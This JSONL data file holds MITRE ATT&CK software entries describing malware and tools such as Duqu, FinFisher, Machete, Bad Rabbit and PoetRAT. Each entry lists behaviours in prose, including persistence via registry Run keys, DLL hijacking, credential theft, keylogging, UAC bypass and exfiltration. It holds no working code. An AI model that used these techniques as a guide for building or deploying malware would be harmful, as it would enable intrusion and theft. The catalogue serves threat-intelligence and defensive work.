{"text": " [Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular approach to extend functionality after deployment within a target network. (Citation: Symantec W32.Duqu)", "idx": "https://attack.mitre.org/software/S0038", "title": "Duqu", "entity": "Duqu", "entity_type": "software", "entity_context": ["Duqu can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.", "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.", "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.", "The reconnaissance modules used with Duqu can collect information on network configuration.", "Duqu is capable of loading executable code via process hollowing.", "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).", "The discovery modules used with Duqu can collect information on open windows.", "Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.", "Duqu can track key presses with a keylogger module.", "Duqu has used <code>msiexec</code> to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.", "The discovery modules used with Duqu can collect information on accounts and permissions.", "The discovery modules used with Duqu can collect information on process details.", "The discovery modules used with Duqu can collect information on network connections.", "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.", "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.", "When the Duqu command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.", "The Duqu command and control protocol's data stream can be encrypted with AES-CBC."], "is_subtechnique": false}
{"text": " A Linux rootkit that provides backdoor access and hides from defenders.", "idx": "https://attack.mitre.org/software/S0221", "title": "Umbreon", "entity": "Umbreon", "entity_type": "software", "entity_context": ["Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.", "Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate.", "Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet", "Umbreon creates valid local users to provide access to the system.", "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet."], "is_subtechnique": false}
{"text": " [DropBook](https://attack.mitre.org/software/S0547) is a Python-based backdoor compiled with PyInstaller.(Citation: Cybereason Molerats Dec 2020)", "idx": "https://attack.mitre.org/software/S0547", "title": "DropBook", "entity": "DropBook", "entity_type": "software", "entity_context": ["DropBook has checked for the presence of Arabic language in the infected machine's settings.", "DropBook can collect the names of all files and folders in the Program Files directories. ", "DropBook has checked for the presence of Arabic language in the infected machine's settings. ", "DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules. ", "DropBook can execute arbitrary shell commands on the victims' machines. ", "DropBook has used legitimate web services to exfiltrate data.", "DropBook is a Python-based backdoor compiled with PyInstaller.", "DropBook can download and execute additional files.", "DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions."], "is_subtechnique": false}
{"text": " [BlackMould](https://attack.mitre.org/software/S0564) is a web shell based on [China Chopper](https://attack.mitre.org/software/S0020) for servers running Microsoft IIS. First reported in December 2019, it has been used in malicious campaigns by [GALLIUM](https://attack.mitre.org/groups/G0093) against telecommunication providers.(Citation: Microsoft GALLIUM December 2019)", "idx": "https://attack.mitre.org/software/S0564", "title": "BlackMould", "entity": "BlackMould", "entity_type": "software", "entity_context": ["BlackMould can copy files on a compromised host.", "BlackMould can send commands to C2 in the body of HTTP POST requests.", "BlackMould can run cmd.exe with parameters.", "BlackMould has the ability to find files on the targeted system.", "BlackMould can enumerate local drives on a compromised host.", "BlackMould has the ability to download files to the victim's machine."], "is_subtechnique": false}
{"text": " [FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)", "idx": "https://attack.mitre.org/software/S0182", "title": "FinFisher", "entity": "FinFisher", "entity_type": "software", "entity_context": ["A FinFisher variant uses a custom packer.", "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.", "FinFisher enumerates directories and scans for certain files.", "FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.", "FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.", "FinFisher performs UAC bypass.", "FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.", "FinFisher checks if the victim OS is 32 or 64-bit.", "FinFisher clears the system event logs using <code> OpenEventLog/ClearEventLog APIs </code>.", "FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.", "FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.", "FinFisher contains junk code in its functions in an effort to confuse disassembly programs.", "FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.", "FinFisher creates a new Windows service with the malicious executable for persistence.", "FinFisher uses DLL side-loading to load malicious programs.", "Some FinFisher variants incorporate an MBR rootkit.", "FinFisher queries Registry values as part of its anti-sandbox checks.", "FinFisher establishes persistence by creating the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\Run</code>.", "A FinFisher variant uses DLL search order hijacking.", "FinFisher hooks processes by modifying IAT pointers to CreateWindowEx.", "FinFisher probes the system to check for antimalware processes.", "FinFisher checks its parent process for indications that it is running in a sandbox setup."], "is_subtechnique": false}
{"text": " [Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. (Citation: ESET Operation Groundbait)", "idx": "https://attack.mitre.org/software/S0113", "title": "Prikormka", "entity": "Prikormka", "entity_type": "software", "entity_context": ["A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.", "Prikormka contains a module that captures screenshots of the victim's desktop.", "Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA.", "A module in Prikormka collects passwords stored in applications installed on the victim.", "A module in Prikormka collects information from the victim about the current user name.", "After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host.", "Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows.", "A module in Prikormka gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.", "A module in Prikormka collects information on available printers and disk drives.", "Prikormka encrypts some C2 traffic with the Blowfish cipher.", "A module in Prikormka collects information from the victim about installed anti-virus software.", "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.", "Prikormka creates a directory, <code>%USERPROFILE%\\AppData\\Local\\SKC\\</code>, which is used to store collected log files.", "Prikormka uses rundll32.exe to load its DLL.", "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.", "After collecting documents from removable media, Prikormka compresses the collected files, and encrypts it with Blowfish.", "Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.", "Prikormka encodes C2 traffic with Base64.", "Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.", "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory."], "is_subtechnique": false}
{"text": " [Egregor](https://attack.mitre.org/software/S0554) is a Ransomware-as-a-Service (RaaS) tool that was first observed in September 2020. Researchers have noted code similarities between [Egregor](https://attack.mitre.org/software/S0554) and Sekhmet ransomware, as well as [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020)", "idx": "https://attack.mitre.org/software/S0554", "title": "Egregor", "entity": "Egregor", "entity_type": "software", "entity_context": ["Egregor has used the Windows API to make detection more difficult. ", "Egregor has used DLL side-loading to execute its payload. ", "Egregor has checked for the LogMein event log in an attempt to encrypt files in remote machines.", "Egregor can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note. ", "Egregor can perform a  long sleep (greater than or equal to 3 minutes) to evade detection.", "Egregor has used batch files for execution and can launch Internet Explorer from cmd.exe. ", "Egregor contains functionality to query the local/system time.", "Egregor has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement.", "Egregor can inject its payload into iexplore.exe process.", "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes. ", "Egregor has used regsvr32.exe to execute malicious DLLs.", "Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel. ", "Egregor has disabled Windows Defender to evade protections.", "Egregor can modify the GPO to evade detection. ", "Egregor has communicated with its C2 servers via HTTPS protocol.", "Egregor can enumerate all connected drives.", "Egregor can perform a language check of the infected system and can query the CPU information (cupid).", "Egregor can conduct Active Directory reconnaissance using tools such as Sharphound or AdFind.", "Egregor has the ability to download files from its C2 server.", "Egregor's payloads are custom-packed, archived and encrypted to prevent analysis.", "Egregor has used rundll32 during execution.", "Egregor has masqueraded the svchost.exe process to exfiltrate data.", "Egregor has been decrypted before execution. ", "Egregor has used tools to gather information about users.", "Egregor has used BITSadmin to download and execute malicious DLLs."], "is_subtechnique": false}
{"text": " [Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)", "idx": "https://attack.mitre.org/software/S0005", "title": "Windows Credential Editor", "entity": "Windows Credential Editor", "entity_type": "software", "entity_context": ["Windows Credential Editor can dump credentials."], "is_subtechnique": false}
{"text": " [Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](https://attack.mitre.org/groups/G0095). It is a Python-based backdoor targeting Windows machines that was first observed in 2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020)", "idx": "https://attack.mitre.org/software/S0409", "title": "Machete", "entity": "Machete", "entity_type": "software", "entity_context": ["Machete retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers. ", "Machete uses the <code>netsh wlan show networks mode=bssid</code> and <code>netsh wlan show interfaces</code> commands to list all nearby WiFi networks and connected interfaces. ", "Machete has been packed with NSIS. ", "Machete renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.", "Machete has a feature to copy files from every drive onto a removable drive in a hidden folder.", "Machete stores zipped files with profile data from installed web browsers. ", "Machete collects the MAC address of the target computer and other network configuration information.", "Once a file is uploaded, Machete will delete it from the machine. ", "Machete collects stored credentials from several web browsers. ", "Machete’s downloaded data is decrypted using AES.", "Machete’s collected files are exfiltrated automatically to remote servers. ", "Machete logs keystrokes from the victim’s machine.", "Machete sends stolen data to the C2 server every 10 minutes. ", "Machete produces file listings in order to search for files to be exfiltrated.", "Machete collects the hostname of the target computer. ", "Machete uses HTTP for Command & Control.", "Machete detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.  ", "Machete has sent data over HTTP if FTP failed, and has also used a fallback server. ", "Machete renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks. ", "Machete has used base64 encoding.", "Machete's collected data is exfiltrated over the same channel used for C2.", "Machete has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.", "Machete takes photos from the computer’s web camera.", "Machete has used TLS-encrypted FTP to exfiltrate data.", "Machete searches the File system for files of interest. ", "Machete can find, encrypt, and upload files from fixed and removable drives. ", "Machete hijacks the clipboard data by creating an overlapped window that listens to keyboard events. ", "Machete has a component to check for running processes to look for web browsers. ", " Machete can download additional files for execution on the victim’s machine. ", "Machete captures screenshots.", "Machete saves the window names. ", "Machete is written in Python and is used in conjunction with additional Python scripts.", "Machete has used AES to exfiltrate documents.", "Machete captures audio from the computer’s microphone.", "Machete stores files and logs in a folder on the local drive.", "The different components of Machete are executed by Windows Task Scheduler.", "Machete used the startup folder for persistence.", "Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.", "Machete's collected data is encrypted with AES before exfiltration. ", "Machete uses FTP for Command & Control.", "Machete has scanned and looked for cryptographic keys and certificate file extensions. "], "is_subtechnique": false}
{"text": " [LoJax](https://attack.mitre.org/software/S0397) is a UEFI rootkit used by [APT28](https://attack.mitre.org/groups/G0007) to persist remote access software on targeted systems.(Citation: ESET LoJax Sept 2018)", "idx": "https://attack.mitre.org/software/S0397", "title": "LoJax", "entity": "LoJax", "entity_type": "software", "entity_context": ["LoJax has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code>.", "LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.", "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems. ", "LoJax has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code> in order to execute its payload during Windows startup.", "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems."], "is_subtechnique": false}
{"text": " [route](https://attack.mitre.org/software/S0103) can be used to find or change information within the local system IP routing table. (Citation: TechNet Route)", "idx": "https://attack.mitre.org/software/S0103", "title": "route", "entity": "route", "entity_type": "software", "entity_context": ["route can be used to discover routing configuration information."], "is_subtechnique": false}
{"text": " [SQLRat](https://attack.mitre.org/software/S0390) is malware that executes SQL scripts to avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) has been observed using it.(Citation: Flashpoint FIN 7 March 2019)", "idx": "https://attack.mitre.org/software/S0390", "title": "SQLRat", "entity": "SQLRat", "entity_type": "software", "entity_context": ["SQLRat has scripts that are responsible for deobfuscating additional scripts.", "SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.\t", "SQLRat relies on users clicking on an embedded image to execute the scripts.", "SQLRat has used been observed deleting scripts once used.\t", "SQLRat has created scheduled tasks in <code>%appdata%\\Roaming\\Microsoft\\Templates\\</code>.", "SQLRat has used SQL to execute JavaScript and VB scripts on the host system.", "SQLRat has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.", "SQLRat has used PowerShell to create a Meterpreter session."], "is_subtechnique": false}
{"text": " [RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by [menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with [PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017)", "idx": "https://attack.mitre.org/software/S0153", "title": "RedLeaves", "entity": "RedLeaves", "entity_type": "software", "entity_context": ["RedLeaves can capture screenshots.", "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll.", "RedLeaves can communicate to its C2 over HTTP and HTTPS if directed.", "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.", "RedLeaves is capable of downloading a file from a specified URL.", "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence.", "RedLeaves can enumerate and search for files and directories.", "RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell.", "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.", "RedLeaves can gather browser usernames and passwords.", "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.", "RedLeaves can enumerate drives and Remote Desktop sessions.", "RedLeaves can obtain information about network parameters.", "RedLeaves uses a specific port of 443 and can also use ports 53 and 80 for C2. One RedLeaves variant uses HTTP over port 443 to connect to its C2 server.", "RedLeaves can use HTTP over non-standard ports, such as 995, for C2.", "RedLeaves can delete specified files.", "A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.", "RedLeaves has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear."], "is_subtechnique": false}
{"text": " [4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike Putter Panda)", "idx": "https://attack.mitre.org/software/S0065", "title": "4H RAT", "entity": "4H RAT", "entity_type": "software", "entity_context": ["4H RAT has the capability to obtain a listing of running processes (including loaded modules).", "4H RAT has the capability to obtain file and directory listings.", "4H RAT has the capability to create a remote shell.", "4H RAT uses HTTP for command and control.", "4H RAT sends an OS version identifier in its beacons.", "4H RAT obfuscates C2 communication using a 1-byte XOR with the key 0xBE."], "is_subtechnique": false}
{"text": " [Bad Rabbit](https://attack.mitre.org/software/S0606) is a self-propagating ransomware that affected the Ukrainian transportation sector in 2017. [Bad Rabbit](https://attack.mitre.org/software/S0606) has also targeted organizations and consumers in Russia. (Citation: Secure List Bad Rabbit)(Citation: ESET Bad Rabbit)(Citation: Dragos IT ICS Ransomware)", "idx": "https://attack.mitre.org/software/S0606", "title": "Bad Rabbit", "entity": "Bad Rabbit", "entity_type": "software", "entity_context": ["Bad Rabbit has masqueraded as a Flash Player installer through the executable file <code>install_flash_player.exe</code>.", "Bad Rabbit drops a file named <code>infpub.dat</code>into the Windows directory and is executed through SCManager and <code>rundll.exe</code>.", "Bad Rabbit has encrypted files and disks using AES-128-CBC and RSA-2048.", "Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks.", "Bad Rabbit has been executed through user installation of an executable disguised as a flash installer.", "Bad Rabbit has used Mimikatz to harvest credentials from the victim's machine.", "Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges.", "Bad Rabbit’s <code>infpub.dat</code> file uses NTLM login credentials to brute force Windows machines.", "Bad Rabbit has used an executable that installs a modified bootloader to prevent normal boot-up.", "Bad Rabbit’s <code>infpub.dat</code> file creates a scheduled task to launch a malicious executable.", "Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a <code>.js</code> file.", "Bad Rabbit has used various Windows API calls.", "Bad Rabbit has used rundll32 to launch a malicious DLL as <code>C:Windowsinfpub.dat</code>.", "Bad Rabbit can enumerate all running processes to compare hashes.", "Bad Rabbit enumerates open SMB shares on internal victim networks."], "is_subtechnique": false}
{"text": " [SDBbot](https://attack.mitre.org/software/S0461) is a backdoor with installer and loader components that has been used by [TA505](https://attack.mitre.org/groups/G0092) since at least 2019.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020)", "idx": "https://attack.mitre.org/software/S0461", "title": "SDBbot", "entity": "SDBbot", "entity_type": "software", "entity_context": ["SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.", "SDBbot has the ability to identify the user on a compromised host.", "SDBbot has the ability to get directory listings or drive information on a compromised host.", "SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.", "SDBbot has the ability to access the file system on a compromised host.", "SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. ", "SDBbot has the ability to communicate with C2 with TCP over port 443.", "SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.", "SDBbot has the ability to use RDP to connect to victim's machines.", "SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.", "SDBbot has the ability to clean up and remove data structures from a compromised host.", "SDBbot has used a packed installer file.", "SDBbot has the ability to download a DLL from C2 to a compromised host.", "SDBbot has the ability to identify the OS version, country code, and computer name.", "SDBbot has the ability to use the command shell to execute commands on a compromised host.", "SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.", "SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2.", "SDBbot has the ability to delete files from a compromised host.", "SDBbot has the ability to decrypt and decompress its payload to enable code execution.", "SDBbot has the ability to record video on a compromised host."], "is_subtechnique": false}
{"text": " [StrongPity](https://attack.mitre.org/software/S0491) is an information stealing malware used by [PROMETHIUM](https://attack.mitre.org/groups/G0056).(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)", "idx": "https://attack.mitre.org/software/S0491", "title": "StrongPity", "entity": "StrongPity", "entity_type": "software", "entity_context": ["StrongPity can use HTTP and HTTPS in C2 communications.", "StrongPity has created new services and modified existing services for persistence.", "StrongPity can use PowerShell to add files to the Windows Defender exclusions list.", "StrongPity can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.", "StrongPity has named services to appear legitimate.", "StrongPity has used encrypted strings in its dropper component.", "StrongPity has encrypted C2 traffic using SSL/TLS.", "StrongPity can install a service to execute itself as a service.", "StrongPity has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.", "StrongPity can identify if ESET or BitDefender antivirus are installed before dropping its payload.", "StrongPity has been signed with self-signed certificates.", "StrongPity can use the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key for persistence.", "StrongPity can determine if a user is logged in by checking to see if explorer.exe is running.", "StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection.", "\nStrongPity has used HTTPS over port 1402 in C2 communication.", "StrongPity can automatically exfiltrate collected documents to the C2 server.", "StrongPity can parse the hard drive on a compromised host to identify specific file extensions.", "StrongPity can identify the hard disk volume serial number on a compromised host.", "StrongPity has been bundled with legitimate software installation files for disguise.", "StrongPity can exfiltrate collected documents through C2 channels.", "StrongPity can delete previously exfiltrated files from the compromised host.", "StrongPity can identify the IP address of a compromised host.", "StrongPity has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.", "StrongPity can download files to specified targets.", "StrongPity has the ability to hide the console window for its document search module from the user.", "StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure."], "is_subtechnique": false}
{"text": " [PoetRAT](https://attack.mitre.org/software/S0428) is a remote access trojan (RAT) that was first identified in April 2020. [PoetRAT](https://attack.mitre.org/software/S0428) has been used in multiple campaigns against the private and public sectors in Azerbaijan, including ICS and SCADA systems in the energy sector. The STIBNITE activity group has been observed using the malware. [PoetRAT](https://attack.mitre.org/software/S0428) derived its name from references in the code to poet William Shakespeare. (Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020)(Citation: Dragos Threat Report 2020)", "idx": "https://attack.mitre.org/software/S0428", "title": "PoetRAT", "entity": "PoetRAT", "entity_type": "software", "entity_context": ["PoetRAT has the ability to list files upon receiving the <code>ls</code> command from C2.", "PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.", "PoetRAT has used a custom encryption scheme for communication between scripts and pyminifier to obfuscate scripts.", "PoetRAT has the ability to compress files with zip.", "PoetRAT has the ability to list all running processes.", "PoetRAT was distributed via malicious Word documents.", "PoetRAT has the ability to take screen captures.", "PoetRAT has called cmd through a Word document macro.", "PoetRAT used TLS to encrypt command and control (C2) communications.", "PoetRAT has used spearphishing attachments to infect victims.", "PoetRAT has executed a Lua script through a Lua interpreter for Windows.", "PoetRAT has the ability to overwrite scripts and delete itself if a sandbox environment is detected.", "PoetRAT was delivered with documents using DDE to execute malicious code.", "PoetRAT has the ability to hide and unhide files.", "PoetRAT has used HTTP and HTTPs for C2 communications.", "PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.", "PoetRAT has used a Python tool named klog.exe for keylogging.", "PoetRAT used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials.", "PoetRAT has used FTP for C2 communications.", "PoetRAT has exfiltrated data over the C2 channel.", "PoetRAT has used Word documents with VBScripts to execute malicious activities.", "PoetRAT has added a registry key in the <RUN> hive for persistence.", "PoetRAT used Nmap for remote system discovery.", "PoetRAT has used a Python tool named Browdec.exe to steal browser credentials.", "PoetRAT used TLS to encrypt communications over port 143", "PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting.", "PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.", "PoetRAT has used FTP for exfiltration.", "PoetRAT used file system monitoring to track modification and enable automatic exfiltration.", "PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.", "PoetRAT has made registry modifications to alter its behavior upon execution.", "PoetRAT has used a .NET tool named dog.exe to exiltrate information over an e-mail account.", "PoetRAT sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.", "PoetRAT has the ability to gather information about the compromised host."], "is_subtechnique": false}
{"text": " [MechaFlounder](https://attack.mitre.org/software/S0459) is a python-based remote access tool (RAT) that has been used by [APT39](https://attack.mitre.org/groups/G0087). The payload uses a combination of actor developed code and code snippets freely available online in development communities.(Citation: Unit 42 MechaFlounder March 2019)", "idx": "https://attack.mitre.org/software/S0459", "title": "MechaFlounder", "entity": "MechaFlounder", "entity_type": "software", "entity_context": ["MechaFlounder has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.", "MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.", "MechaFlounder has the ability to use base16 encoded strings in C2.", "MechaFlounder has the ability to identify the username and hostname on a compromised host.", "MechaFlounder has the ability to upload and download files to and from a compromised host.", "MechaFlounder uses a python-based payload.", "MechaFlounder has the ability to run commands on a compromised host.", "MechaFlounder has the ability to use HTTP in communication with C2."], "is_subtechnique": false}
{"text": " [Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes control of the victim before MBR. (Citation: Ge 2011)", "idx": "https://attack.mitre.org/software/S0001", "title": "Trojan.Mebromi", "entity": "Trojan.Mebromi", "entity_type": "software", "entity_context": ["Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal."], "is_subtechnique": false}
{"text": " [QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)", "idx": "https://attack.mitre.org/software/S0269", "title": "QUADAGENT", "entity": "QUADAGENT", "entity_type": "software", "entity_context": ["QUADAGENT encodes C2 communications with base64.", "QUADAGENT used the PowerShell filenames <code>Office365DCOMCheck.ps1</code> and <code>SystemDiskClean.ps1</code>.", "QUADAGENT gathers the current domain the victim system belongs to.", "QUADAGENT uses cmd.exe to execute scripts and commands on the victim’s machine.", "QUADAGENT uses PowerShell scripts for execution.", "QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.", "QUADAGENT uses HTTPS and HTTP for C2 communications.", "QUADAGENT creates a scheduled task to maintain persistence on the victim’s machine.", "QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.", "QUADAGENT gathers the victim username.", "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.", "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.", "QUADAGENT has a command to delete its Registry key and scheduled task.", "QUADAGENT uses VBScripts.", "QUADAGENT was likely obfuscated using Invoke-Obfuscation.", "QUADAGENT uses DNS for C2 communications."], "is_subtechnique": false}
{"text": " [sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. (Citation: sqlmap Introduction)", "idx": "https://attack.mitre.org/software/S0225", "title": "sqlmap", "entity": "sqlmap", "entity_type": "software", "entity_context": ["sqlmap can be used to automate exploitation of SQL injection vulnerabilities."], "is_subtechnique": false}
{"text": " [Bonadan](https://attack.mitre.org/software/S0486) is a malicious version of OpenSSH which acts as a custom backdoor. [Bonadan](https://attack.mitre.org/software/S0486) has been active since at least 2018 and combines a new cryptocurrency-mining module with the same credential-stealing module used by the Onderon family of backdoors.(Citation: ESET ForSSHe December 2018)", "idx": "https://attack.mitre.org/software/S0486", "title": "Bonadan", "entity": "Bonadan", "entity_type": "software", "entity_context": ["Bonadan can XOR-encrypt C2 communications.", "Bonadan can find the external IP address of the infected host.", "Bonadan can create bind and reverse shells on the infected system.\t", "Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.", "Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.", "Bonadan can download an additional module which has a cryptocurrency mining extension.", "Bonadan can download additional modules from the C2 server.", "Bonadan has discovered the username of the user running the backdoor.", "Bonadan can use the <code>ps</code> command to discover other cryptocurrency miners active on the system."], "is_subtechnique": false}
{"text": " [BADFLICK](https://attack.mitre.org/software/S0642) is a backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065) in spearphishing campaigns first reported in 2018 that targeted the U.S. engineering and maritime industries.(Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019)", "idx": "https://attack.mitre.org/software/S0642", "title": "BADFLICK", "entity": "BADFLICK", "entity_type": "software", "entity_context": ["BADFLICK has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.", "BADFLICK can decode shellcode using a custom rotating XOR cipher.", "BADFLICK has relied upon users clicking on a malicious attachment delivered through spearphishing.", "BADFLICK has searched for files on the infected host.", "BADFLICK has download files from its C2 server.", "BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes.", "BADFLICK has captured victim IP address details.", "BADFLICK has uploaded files from victims' machines.", "BADFLICK has captured victim computer name, memory space, and CPU details.", "BADFLICK has compressed data using the aPLib compression library."], "is_subtechnique": false}
